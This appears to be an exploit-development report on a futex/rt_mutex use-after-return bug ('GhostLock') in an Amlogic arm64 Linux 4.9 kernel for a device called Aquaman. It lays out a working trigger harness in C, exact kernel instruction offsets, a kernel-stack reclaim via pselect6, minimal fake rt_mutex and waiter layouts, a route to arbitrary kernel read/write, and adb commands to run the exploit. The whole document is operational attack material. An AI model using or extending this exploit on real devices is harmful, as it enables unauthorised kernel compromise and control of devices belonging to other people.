# GhostLock breakthrough — the Aquaman form

Date: 2026-09-30. Offline analysis against `.src/linux-amlogic` (4.9.113,
Amlogic, arm64, SCHED_DEADLINE backport) and `build-aq/vmlinux` (matching ELF
with DWARF). No device was touched in this round.

Every offset below was read out of the lab image, not copied from another
device and not copied from Hazel. Where a number is an inference for stock, it
says so.

---

## 1. Current blocker

The blocker was never the trigger. It is a design error in the harness that has
survived nine rounds:

```
tools/ghostlock_oracle_v2.c:148   xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
```

The waiter releases `f_chain` immediately after the rollback. `f_chain`'s
`pi_mutex` is the only rt_mutex the waiter *owns*, and `owner` is the only role
from which the kernel reaches a task's dangling `pi_blocked_on`. Dropping the
lock removes the waiter from the PI graph as an owner, so after `[teardown]`
there is **no path left in the kernel that can reach `waiter_task->pi_blocked_on`
at all.**

The accessors of `pi_blocked_on` are a closed set. I enumerated every one of
them by scanning the whole image for the field's displacement and resolving
each hit through `llvm-addr2line -i` to kill struct-collision false positives:
**14 instructions total**, `offsetof(task_struct, pi_blocked_on) == 0x7f0`
confirmed by all 2691 DWARF CUs. No `ldp`/`stp` pair, no LSE atomics, no
`add`-materialised alias. The field is only ever touched by plain `ldr`/`str`
under `pi_lock`.

Result: **after `tools/ghostlock_oracle_v2.c:148` runs `FUPI(f_chain)`, every
dereferencing site in that table is unreachable.** The only remaining one,
`schedule()`, null-tests the pointer and never follows it, so it cannot fault.

So the nine rounds were measuring a crash in a geometry where the bug cannot be
walked. That is why the diagnosis kept moving: gate2 blamed the owner join,
gate3 blamed process exit, hold blamed the settle. **Those were all
red herrings generated by an unrelated actor, because the GhostLock path itself
was dead.**

## 2. First inevitable dangling-pointer consumer

Not a scheduler call. **A plain `FUTEX_LOCK_PI` from a fourth thread.**

```
FUTEX_LOCK_PI(f_chain)            <- any thread, unprivileged, one syscall
  futex_lock_pi()                          futex.c:2545
    futex_lock_pi_atomic()                 futex.c:1172
      attach_to_pi_owner() -> returns 0, we have pi_state, no error
    queue_me(&q, hb)
    rt_mutex_timed_futex_lock(&pi_state->pi_mutex, to)   futex.c:2610
      rt_mutex_timed_fastlock(..., RT_MUTEX_FULL_CHAINWALK, rt_mutex_slowlock)
        __rt_mutex_slowlock() -> task_blocks_on_rt_mutex()   rtmutex.c:971
          owner = lock->owner  == waiter_task
          ...
          rt_mutex_enqueue_pi(waiter_task, X_waiter)        rtmutex.c:1019
          __rt_mutex_adjust_prio(waiter_task)
          if (owner->pi_blocked_on)   chain_walk = 1;      rtmutex.c:1020  <<<<
          next_lock = task_blocked_on_lock(owner);         rtmutex.c:1027  <<<<
          rt_mutex_adjust_prio_chain(owner, FULL_CHAINWALK, lock, next_lock,
                                     X_waiter, X)         rtmutex.c:1047  <<<<
```

`FULL_CHAINWALK` is what makes this the strong consumer. It is used by exactly
two callers: `rt_mutex_timed_futex_lock` (this one) and
`rt_mutex_start_proxy_lock` (the trigger itself). `rt_mutex_timed_futex_lock`
is reached only from `futex_lock_pi`, which is reached only from `FUTEX_LOCK_PI`
and `FUTEX_LOCK_PI_PRIVATE`. Not `FUTEX_TRYLOCK_PI`: that goes to
`rt_mutex_trylock` -> `rt_mutex_slowtrylock` (rtmutex.c:1322), which returns 0
without ever calling `task_blocks_on_rt_mutex`.

`FULL_CHAINWALK` also matters for *how far* the walk goes. In
`rt_mutex_adjust_prio_chain`, `detect_deadlock` is false for `MIN_CHAINWALK`,
so rtmutex.c:604 `if (waiter->prio == task->prio) { if (!detect_deadlock) goto
out_unlock_pi; }` stops the walk when the priorities happen to match. With
`FULL_CHAINWALK` the same test sets `requeue = false` and *continues*, so the
`raw_spin_trylock` at 0xffffff8009104e44 is reached **whatever value we put in
`waiter->prio`**. The choice of consumer is not just convenient, it is what
removes the prio constraint from the primitive.

Confirmed in the lab image:

```
ffffff80091053e8:  ldr  x0, [x22, #0x7f0]      ; owner->pi_blocked_on
ffffff80091052f8:  cbz  x0, ...                ; NULL -> return 0, walk stops
ffffff80091052fc:  ldr  x25, [x0, #0x38]       ; owner->pi_blocked_on->lock  FIRST DEREF
...
ffffff8009105378:  bl   0xffffff8009104d68 <rt_mutex_adjust_prio_chain>
```

Both branches (newcomer becomes top waiter via `0x53c8`, or takes the
deadlock-detect branch) converge on `0x52f8`. There is no timing race and no
priority requirement. It is deterministic.

Inside `rt_mutex_adjust_prio_chain`, the walk then reaches our forged lock:

```
ffffff8009104e60:  ldr  x28, [x19, #0x7f0]     ; waiter = task->pi_blocked_on
ffffff8009104df0:  ldr  x0,  [x28, #0x38]      ; waiter->lock
ffffff8009104df4:  cmp  x20, x0                ; next_lock != waiter->lock -> bail
ffffff8009104e28:  ldr  w1,  [x28, #0x40]      ; waiter->prio
ffffff8009104e40:  mov  x0, x20
ffffff8009104e44:  bl   _raw_spin_trylock     ; <<<< ARBITRARY cmpxchg at lock+0x00
ffffff8009104f48:  bl   rt_mutex_dequeue
ffffff8009104f54:  str  w0, [x28, #0x40]       ; <<<< WRITE waiter->prio
ffffff8009104f60:  str  x3, [x28, #0x48]       ; <<<< WRITE waiter->deadline
ffffff8009104f64:  bl   rt_mutex_enqueue       ; <<<< WRITES lock+0x08 and lock+0x10
ffffff8009104f9c:  ldr  x19, [x20, #0x18]      ; lock->owner
ffffff8009104fa4:  add  x21, x19, #0x28
ffffff8009104fac:  ldxr / 4fb0 add #1 / 4fb4 stxr   ; <<<< atomic inc (get_task_struct)
ffffff8009104fc8:  bl   _raw_spin_lock         ; <<<< cmpxchg at owner+0x7d4
ffffff8009104ff0:  ldr  x0,  [x19, #0x7f0]     ; owner->pi_blocked_on  (recursion)
```

`x20` at `4f40` is `next_lock`, which is byte-for-byte the `waiter->lock` we
wrote at `4df0`. From `4e44` onward, every memory access is at an address we
chose. This is not a "primitives are plausible" situation: the deref chain is
a straight line from `task->pi_blocked_on` into attacker-chosen memory, with
writes on the way back out.

Classification of the two candidates the mission asked about:

```
EDEADLK
   |
   v
dangling rt_waiter  (waiter_task->pi_blocked_on, waiter kernel stack slot)
   |
   +----------------------+----------------------+
   |                      |                      |
   v                      v                      v
A: FUTEX_LOCK_PI     B: pthread_setsched-   C: (anything else)
   by thread X          param(waiter)
   survives if         survives, reads
   lock+0x18 == 0      exactly 1 word (+0x40)
```

`pthread_setschedparam` was the wrong consumer and it is worth saying why it can
never be a value oracle in this geometry: `rt_mutex_adjust_pi` only reads
`+0x40` and returns when `waiter->prio == task->prio`, and
`rt_mutex_get_effective_prio` reads the *other* tree (`pi_waiters` at `+0x7e0`),
which the waiter never populates. The `f18` oracle the previous round designed
was measuring a path that returns `newprio` unchanged.

## 3. Exact crash path

I could not derive the crash path of the six prior panics from source, and I am
not going to invent one. What is provable:

**It is not a PI walk.** With the waiter holding no rt_mutex after `FUPI(f_chain)`,
the four readers above are all unreachable, so no code in the kernel walks the
dangling `pi_blocked_on`. Whatever kills the box in that geometry is a
different, non-GhostLock actor.

Two structural candidates remain, and both are consequences of the same harness
bug (the waiter giving up `f_chain`):

1. `pi_state2` (the requeue target's `futex_pi_state`) stays alive for the
   whole trial because nobody ever runs `FUTEX_UNLOCK_PI(f_target)`. In
   `tools/ghostlock_oracle_v2.c` the owner thread exits while still holding it,
   so `pi_state2->pi_mutex.owner` and `pi_state2->owner` end up pointing at a
   freed `task_struct`. `exit_pi_state_list` cannot clean it: it is called from
   `mm_release` (`kernel/fork.c:1127`), which only runs when `mm_users` hits
   zero, and main is still alive. Unlocking `f_target` would not even free the
   object: `put_pi_state()` parks it on the freeing thread's per-thread cache
   (see section 6).
2. The waiter is left in `hb1` (`f_wait`'s bucket) with `q.rt_waiter != NULL`
   and `q.pi_state == NULL` — `futex_requeue` explicitly sets
   `this->pi_state = NULL; put_pi_state(pi_state); break;` at futex.c:1985-1987
   on the EDEADLK path. The waiter then wakes through
   `handle_early_requeue_pi_wakeup`, which is only saved by the
   `!match_futex(&q->key, key2)` early `-EINVAL`.

Either could be it. The redesigned trigger below removes both by never leaving
a half-torn-down PI state behind, so the question becomes moot.

One more structural note from the full scan, because it is the only thing that
*is* an automatic, data-dependent reader of the field:

```
ffffff8009df70ec: mrs  x0, SP_EL0
ffffff8009df70f0: ldr  x1, [x0, #0x18]   ; tsk->state
ffffff8009df70f4: cbz  x1, ...
ffffff8009df70f8: ldr  x1, [x0, #0x7f0]  ; tsk->pi_blocked_on
ffffff8009df70fc: cbz  x1, ...           ; only a NULL test
```

`sched_submit_work()` calls `tsk_is_pi_blocked()` on **every** `schedule()`, so
the value of `pi_blocked_on` steers a conditional branch in the hottest function
in the kernel. That is a genuine data-dependent branch, but it is a `cbz` on a
value the process already knows, so it is worth roughly one branch
misprediction and it is buried under the cost of `__schedule()`. It is a
*behavioural* signal (the waiter skips `blk_schedule_flush_plug` while the
field is stale), not a fault and not a usable timing oracle on its own.
Recorded so nobody builds the next round on it and gets the same nothing the
futex-wake oracle got.

**Residual risk in the redesign, stated up front.** `CONFIG_PREEMPT=y`, so the
waiter thread can be preempted inside the stamp window and kernel code will run
on its stack. That is a source of *probabilistic* misses (window clobbered
between the stamp and the consumer) as opposed to a deterministic miss (wrong
PAD). The two are distinguishable on device: wrong PAD misses every time, a
clobber misses sometimes. If the sweep at `PAD=0x120` comes back with the page
written on some runs and not others, that is a clobber, not an offset.

**Discriminating experiment** (variant C, one boot, binary question):
> "does the process survive with zero syscalls, zero timers and zero consumers
> after the EDEADLK?"

```
EDEADLK -> waiter returns -> for(;;) asm volatile("" ::: "memory");
```
No `sleep`, no `usleep`, no `pselect`, no `/proc`, no `join`, no heartbeat, no
consumer. If that survives 60s, candidate 1 and 2 are both about the teardown
and the GhostLock path was never the crasher. If it dies, the async actor is
found and the trigger geometry is wrong.

That is one reboot and it settles the question the nine rounds left open.

## 4. Redesigned trigger

Three changes, all of them removals or re-orderings. No new mechanism.

```c
/* waiter */
FLPI(&f_chain);                       /* waiter OWNS f_chain and keeps it */
FWRQ(&f_wait, timeout, &f_target);    /* -> EDEADLK, dangling pi_blocked_on   */
/* NO FUPI(f_chain). NO sleep. NO settle. NO join.                     */
/* stamp happens here, in the same frame, then: */
for (;;) asm volatile("" ::: "memory");

/* owner */
FLPI(&f_target);                      /* owner OWNS f_target */
FLPI(&f_chain);                       /* blocks; chain becomes 2-deep          */

/* main */
FCRQ(&f_wait, 1, &f_target);          /* -> EDEADLK                             */
/* immediately: */
```

Consumer, from any thread including main:

```c
FLPI(&f_chain);       /* walks waiter's dangling pi_blocked_on, on purpose */
```

Why each piece is there:

* **The waiter keeps `f_chain`.** This is the whole fix. It is the only role
  from which the kernel walks a task's `pi_blocked_on`, so it is what makes the
  bug reachable on demand instead of by luck.
* **The owner never unlocks `f_target`,** so `pi_state2` stays allocated and
  `waiter->lock`'s stale value is never a dangling heap pointer. We are not
  chasing a freed slab here; we are chasing a stale stack slot.
* **The waiter never wakes up again.** No `FUPI`, no `sleep`, no timer, no
  heartbeat thread, no reader thread, no `/proc`, no `join`. Every one of those
  was a syscall on the waiter's kernel stack, i.e. every one of them was an
  uncontrolled writer into the window we are trying to control.
* **The stamp runs inside the same frame as the futex.** See section 5.

On the wake mechanism (mission variant E). The rollback path that produces
EDEADLK is `remove_waiter()` inside `rt_mutex_start_proxy_lock()`, and it only
runs on the `FUTEX_CMP_REQUEUE_PI` path. `timeout` and `FUTEX_WAKE` and
`FUTEX_UNLOCK_PI` never call `rt_mutex_start_proxy_lock`, so they cannot
produce the bug at all — they are not alternatives to compare, they are simply
not triggers. Within the CMP geometry the only free variable is *when the
waiter returns*, and the answer is "never": keeping the waiter parked in
`futex_wait_queue_me` leaves the least PI residue, because the futex_q stays
intact with `rt_waiter` set and no `pi_state`.

## 5. Reclaim strategy

**The reclaim target is the waiter's own 16 KB kernel stack, not a slab.**

Measured chain in `build-aq/vmlinux`:

```
SyS_futex                            stp [sp,#-0x70]!   @0xffffff800913ca30
  do_futex                           stp [sp,#-0x120]!  @0xffffff800913bec0
    futex_wait_requeue_pi.constprop.8 stp [sp,#-0x1a0]! @0xffffff800913b398
      add x21, x29, #0x80                                @0xffffff800913b454
```

`0x70 + 0x120 + 0x1a0 = 0x330`, and the `rt_waiter` sits at `x29 + 0x80`:

```
rt_waiter = SP_syscall_entry - 0x330 + 0x80 = SP_syscall_entry - 0x2b0
```

`CONFIG_THREAD_INFO_IN_TASK=y` and
`arch/arm64/include/asm/thread_info.h:32` give `THREAD_SIZE = 0x4000`,
`THREAD_START_SP = 0x3ff0`. So the syscall entry SP is in `[0x3c60, 0x3ff0]` and
the `rt_waiter` lives at **page offset 0xc60..0xd40 of the top kernel stack
page** — a 4 KB page, 80 bytes inside it.

Consequences:

* **No slab, no cache, no object index, no freelist ordering, no
  `mm_struct`, no `/proc/pid/maps`, no KASLR.** The address of the object we
  reclaim is a compile-time constant of the kernel binary.
* The reclaim itself is "make the waiter issue any syscall". The only precision
  required is that the new syscall's frames cover `[entrySP-0x330, entrySP-0x260]`.
* `pselect6` is a good stamper and only one call is needed. In the lab:
  `SyS_pselect6` frame `0x90`, `core_sys_select` frame `0x190`, `stack_fds` at
  `x29+0x90`, i.e. `SP_psel - 0x190`. With `SP_psel = SP_futex - PAD` the
  controlled window is `[SP_futex-PAD-0x190, SP_futex-PAD-0xa0]`, 0xf0 bytes.
  The `rt_waiter` is 0x50 bytes at `[SP_futex-0x2b0, SP_futex-0x260]`, fully
  covered for `PAD ∈ [0x120, 0x1c0]`, window aligned to the waiter's base at
  `PAD = 0x120`.
* Both fields we need are at window bytes `0x38` and `0x40`, both inside
  `stack_fds[0]` (the `readfds` slot, `copy_from_user`'d verbatim). The three
  `memset(0)` result slots start at window `+0x78`, so they do not touch the
  waiter. **The deep/shallow pselect pair in `ghostlock_oracle_v2.c` is not
  needed for a 0x120 stamp** — it exists only to reach a payload that hangs off
  the `task_struct` fake, which we no longer need.

The one thing the previous rounds got right and I am keeping: the PAD sweep has
to actually move SP. `stamp_at()` in `ghostlock_oracle_v2.c:97` allocates a
fixed `MAX_PAD` VLA and varies only the memset length, so the user SP is
identical for every PAD and the sweep was a no-op. Fix by making the pad a
compile-time constant of a `noinline` wrapper, or by issuing the raw
`syscall(SYS_pselect6, ...)` from one function with the pad baked in, and by
printing `(uintptr_t)&local` so the movement is proven on device rather than
assumed.

## 6. Whether mm leak is actually necessary

**No. It was never necessary, and it was never in the path.**

Three independent reasons:

1. **Wrong object.** The dangling pointer is `waiter_task->pi_blocked_on`,
   which points at a `rt_mutex_waiter` on a *kernel stack*, not at anything in
   `mm_cachep`. Reclaiming the `mm_struct` slab page — Hazel's approach as
   summarised in `ghostlock-port-comparison.md` — does not put our bytes where
   this kernel will read them. The `futex_pi_state` object is the only heap
   object on the chain, and it is kept alive on purpose here.
2. **Wrong value.** We do not need to read a kernel pointer out of the reclaim;
   we need to write one in. `waiter->lock` can point at our own `mmap`'d page:
   `CONFIG_SW_TTBR0_PAN` is unset, so an EL1 access to a user VA is allowed and
   does not fault. Same for `waiter->prio`, which just has to differ from the
   waiter's SCHED_OTHER prio (120).
3. **Wrong observation.** Every write the walk performs lands either in the
   fake waiter (which sits in our own `pselect` window, on our stack, readable
   by us) or in the fake lock (which sits in our own page). Success and failure
   are both readable from userspace. Nothing needs to be leaked out.

So: `mm_struct` 0x338 / stride 0x340 / order 2 / 19 objects, the SLUB freelist
ordering, `CONFIG_SLAB_FREELIST_RANDOM`, CPU pinning for the allocator, and the
futex-hash timing oracle are all **dropped from this line of work**. Section 5's
stack offset is the only calibration left, and it is a byte constant that a
PAD sweep resolves without a reboot.

`CONFIG_RANDOMIZE_BASE=y` is set in `aquaman-config`, so KASLR is on for text —
irrelevant here, because we never dereference a kernel VA. Flagged for the
record so nobody re-opens it.

### The heap object on the chain, for the record

Two corrections to the working assumptions here, both verified against the tree
and the lab DWARF rather than taken on trust:

* **There is no `futex_pi_state_cache` in 4.9.** `kernel/futex.c` contains zero
  `kmem_cache_create()` calls; the only allocation is
  `kzalloc(sizeof(*pi_state), GFP_KERNEL)` at futex.c:788 inside
  `refill_pi_state_cache()`. The dedicated cache is a 5.x addition.
* **`sizeof(struct futex_pi_state) == 0x58`**, not 0x50. DWARF DIE `0x00a8db07`,
  `DW_AT_byte_size 0x58`, decl futex.c:197, one complete definition in the image:

  ```
  0x00  list      list_head   0x10
  0x10  pi_mutex  rt_mutex    0x20
  0x30  owner     task *      0x08
  0x38  refcount  atomic_t    0x04   (+4 pad)
  0x40  key       futex_key   0x18
  ```

So `pi_state2` is a **kmalloc-128** object (88 requested, `s->object_size` and
`s->inuse` both 0x80, stride 0x80, order 0, 0x1000 slab, 32 objects, `s->offset
= 0`, `s->align = 64`). Two consequences, both of which argue for the current
design rather than against it:

* If anyone later wants a *real* reclaim-based fake rt_mutex at
  `pi_state + 0x10` (wait_lock `+0x10`, waiters `+0x18`, waiters_leftmost
  `+0x20`, owner `+0x28`), the target is the shared kmalloc-128 cache, which
  every 89..128-byte allocation on the box competes for. There is no
  `CONFIG_SLAB_FREELIST_RANDOM`, so head-insert/head-pop is LIFO and *can* be
  made to work, but it is not a contract: another CPU can `acquire_slab()`
  the whole freelist first, `__slab_free` puts objects on `page->freelist`
  where any CPU may pick that slab, `deactivate_slab()` deliberately leaves the
  last object on the CPU (slub.c:2010-2032), the cpu_partial stack reorders
  slabs via `DEACTIVATE_TO_TAIL`, and `inuse == 0` discards the slab entirely.
  That is five ways to lose, which is why the stack route is the one we take.
* **Do not try to free `pi_state2` by unlocking it.** `put_pi_state()`
  (futex.c:820) does not `kfree` in the common case: if the calling thread has
  an empty `current->pi_state_cache` it parks the object there with refcount
  reset to 1, and `alloc_pi_state()` (futex.c:804) hands the same memory back
  on the next `LOCK_PI` from that thread. "Unlock to free" is not a thing in
  this kernel, and a design that assumed it would be chasing an object that
  silently migrates between threads.

## 7. Minimal fake object

Start at the rt_mutex_waiter, as instructed. The minimum is **two words**:

```
fake rt_mutex_waiter  (0x50 bytes, only 0x38..0x47 are load-bearing)
  +0x38  lock   = &fake_lock      (8B)   -> where the kernel will cmpxchg
  +0x40  prio   = 1                (4B)   -> must be != 120 or the walk returns
```

Two words, both inside one `fd_set`. For the second, controlled deref
(`rt_mutex_adjust_prio_chain` after the trylock), add:

```
fake rt_mutex  (0x20 bytes, in our own mmap'd page)
  +0x00  wait_lock       = 0        (4B)  trylock must succeed
  +0x08  waiters.rb_node = 0        (8B)  enqueue walks an empty tree
  +0x10  waiters_leftmost= 0        (8B)  enqueue WRITES the waiter pointer here
  +0x18  owner           = 0        (8B)  0 -> the walk returns 0, no recursion
```

and to make the walk terminate on the fourth field, set
`fake rt_mutex_waiter.tree_entry` (bytes `0x00..0x17`) to the self-pointer form
`RB_CLEAR_NODE` so `rt_mutex_dequeue` early-returns at rtmutex.c:273
(`if (RB_EMPTY_NODE(&waiter->tree_entry)) return;`).

Nothing else. No `task_struct`, no `file_operations`, no `configfs_buffer`,
no `ashmem_area`. Explicitly deferred: those are only needed for the *final*
kernel R/W, which is section 8, and only if section 8 does not already work.

Read-back accounting for the whole 0x50-byte object, so nobody guesses:

| field | who reads it | when |
|---|---|---|
| `tree_entry` +0x00..0x17 | `rt_mutex_dequeue` (RB_EMPTY_NODE), `rb_erase` | only after the trylock |
| `pi_tree_entry` +0x18..0x2f | `rt_mutex_dequeue_pi` / `enqueue_pi` | only if something blocks on the *fake owner* |
| `task` +0x30 | `task_top_pi_waiter()->task` in `rt_mutex_get_effective_prio`/`getprio` | not on our path |
| `lock` +0x38 | `rt_mutex_adjust_prio`, `task_blocked_on_lock`, `rt_mutex_adjust_prio_chain` | **always, twice** |
| `prio` +0x40 | same three | **always, twice** |
| `deadline` +0x48 | written by the walk at 0xffffff8009104f60, read by nothing on our path | write-only |

`lock` and `prio` are the only two fields the minimum primitive touches. A
0x50-byte fake with 16 meaningful bytes proves the chain; a 0xf0-byte
`task_struct + fops` blob does not prove anything more and costs six more
reclaims.

## 8. Candidate kernel R/W path

Once `task_blocks_on_rt_mutex` walks into our fake lock, the escalation is
already in the kernel. Reading `rt_mutex_adjust_prio_chain` in order, all
offsets relative to `lock = fake_waiter + 0x38`:

| step | instruction | effect |
|---|---|---|
| 1 | `4e44 bl _raw_spin_trylock` | **cmpxchg** at `lock + 0x00` |
| 2 | `4e50 bl _raw_spin_unlock` (on retry) | **store 0** at `lock + 0x00` |
| 3 | `4f54 str w0, [x28,#0x40]` | **store** `task->prio` at `fake_waiter+0x40` |
| 4 | `4f60 str x3, [x28,#0x48]` | **store** `task->dl.deadline` at `fake_waiter+0x48` |
| 5 | `4f64 rt_mutex_enqueue` | **stores** `&fake_waiter->tree_entry` at `lock+0x10` and at `lock+0x08` |
| 6 | `4fac ldxr / 4fb0 add #1 / 4fb4 stxr` at `lock->owner + 0x28` | **atomic increment** at `lock + 0x28 + 0x18` |
| 7 | `4fc8 bl _raw_spin_lock` at `lock->owner + 0x7d4` | **cmpxchg** at `lock + 0x18 + 0x7d4` |
| 8 | `4ff0 ldr [x19,#0x7f0]` / `4ff8 ldr [x0,#0x38]` | **arbitrary read** via `lock->owner` |

Step 6 is the interesting one: it is an unconditional `refcount_inc` followed by
a `refcount_dec_and_test` on an address derived purely from `lock+0x18`.
Turning that into arbitrary-write is the classic refcount-overflow trick, and
it needs nothing from userspace that we do not already have.

If `lock->owner` points at our own page for step 6, the increment and decrement
are both visible to us after the syscall returns. That is the confirmation
test for section 8 without pointing the primitive at anything real.

Hazel's `configfs_buffer` + `ashmem` route was the *second half* of Hazel's chain
(a way to turn the kernel write into a file operation). On Aquaman it is not
needed for this step and it is not the next step. `reports/ghostlock-ashmem-configfs.md`
records that configfs is mounted and `/dev/ashmem` is reachable from shell, so
the route is not closed, but it is strictly downstream.

## 9. Minimal device experiment

One experiment, one reboot, one binary question.

> **"Does `FUTEX_LOCK_PI(f_chain)` from a fourth thread read `waiter->lock` out
> of the stamped window?"**

```
threads:  waiter   -> FLPI(f_chain); FWRQ(f_wait -> f_target, 30s timeout)
                    -> (EDEADLK already happened) -> stamp(PAD=0x120)
                    -> for(;;) asm
          owner    -> FLPI(f_target); FLPI(f_chain)   // stays blocked forever
          main     -> FCRQ(f_wait, 1, f_target)        // must be errno 35
                    -> FLPI(f_chain)                   // <== THE ONLY CONSUMER
          probe    -> thread on CPU0 that reads main's
                      fake page +0x08 and +0x10 after 200 ms
```

`fake page` layout, and what each result means:

```
+0x00 wait_lock        = 0
+0x08 waiters.rb_node  = 0     -> if it becomes nonzero: the kernel wrote
+0x10 waiters_leftmost = 0        here => the fake lock was reached
+0x18 owner            = 0
```

| observation | verdict |
|---|---|
| `+0x10` nonzero and the write equals `&fake_waiter + 0x00` | HIT. The chain is real, `FUTEX_LOCK_PI` consumed the dangling pointer |
| `+0x10` still 0, `FLPI(f_chain)` returned promptly | the walk stopped before the enqueue. Expected sub-cases: wrong PAD, or `waiter->prio == 120` |
| `FLPI(f_chain)` never returns, no reboot | `raw_spin_trylock` failed and the kernel is in the `cpu_relax(); goto again` loop at 0xffffff8009104e4c. Also a HIT — it proves the fake lock was dereferenced |
| reboot | the fake lock address was not where we thought |
| some runs hit, some miss, same PAD | window clobbered by preemption, not a wrong offset |

Both non-crash outcomes are evidence. The reboot is the only lossy one, and it is
the only one that tells us the offset is wrong — which is a 1-byte sweep on
`PAD`, not a redesign.

Hard constraints on the harness, taken from what killed the previous nine
rounds:

* no `sleep`, no `usleep`, no `nanosleep`, no `pselect`, no `/proc`, no
  `pthread_join`, no heartbeat thread, no reader thread, no `setschedparam`
  after the stamp, on **any** thread;
* no CPU affinity pinning (it only adds syscalls; it never removed an actor);
* the stamp is a single `pselect6`, pad `0x120`, and the first userspace
  operation after the syscall return is the stamp;
* if the answer needs a second observation, it comes from a page we own, never
  from `/proc/<tid>/stat`.

## 10. Next single step

Run **experiment 9**, already written up as `tools/ghostlock_chain.c`, one
reboot, and read back `page[0x10]`.

```
adb push ghostlock_chain /data/local/tmp/
adb shell /data/local/tmp/ghostlock_chain
```

Two things are worth saying about how that harness is built, because both were
failure modes of the previous rounds:

**It does not sweep.** The pad is solved on device, in one boot. The waiter
records the SP its `FUTEX_WAIT_REQUEUE_PI` `svc` actually ran at, and the SP the
`pselect6` `svc` actually ran at, using the same inline-asm probe for both, and
main closes the fixed point:

```
stack_fds[0]  == sp_psel - FD_OFF            FD_OFF        = 0x190
&rt_waiter    == sp_futex - WAITER_OFF_SP    WAITER_OFF_SP = 0x2b0
=> pad_new = pad + sp_futex - sp_psel + FD_OFF - WAITER_OFF_SP
```

With the lab numbers `FD_OFF - WAITER_OFF_SP` is `-0x120`, so the prediction is
`pad_new == pad` and the loop converges on attempt 1. If the stock binary's
frame chain differs, attempt 1 prints a different implied pad, the waiter
re-stamps with it, and it converges on attempt 2. Either way the operator sees
the measured SPs, so a miss is diagnosable instead of just "try the next boot".

**It issues no syscall on the waiter after the last stamp.** The waiter parks in
`for (;;) asm volatile("yield" ::: "memory")`. The calibration hand-off uses
`__atomic_load_n`/`__atomic_store_n` on plain userspace words, not a futex,
because a futex would be another kernel entry into the very stack we just
claimed. Main polls with `usleep`, which is fine: main's stack is not the one
under test.

The offline instrument from this round is
`tools/ghostlock_deref_chain.py`. It prints the deref chain of any
`pi_blocked_on` accessor straight out of `build-aq/vmlinux`, one hop per
instruction, so the "how many words does the fake have to survive" question is
answered by the binary and not by a note:

```
python3 tools/ghostlock_deref_chain.py build-aq/vmlinux task_blocks_on_rt_mutex
python3 tools/ghostlock_deref_chain.py build-aq/vmlinux rt_mutex_adjust_prio_chain
python3 tools/ghostlock_deref_chain.py build-aq/vmlinux --all
```

Caveat on that tool: the chain walk is linear, not SSA, so register reuse
inflates the hop count. Treat it as an upper bound and read the authoritative
per-hop instructions in section 2 and section 8 when the count matters.
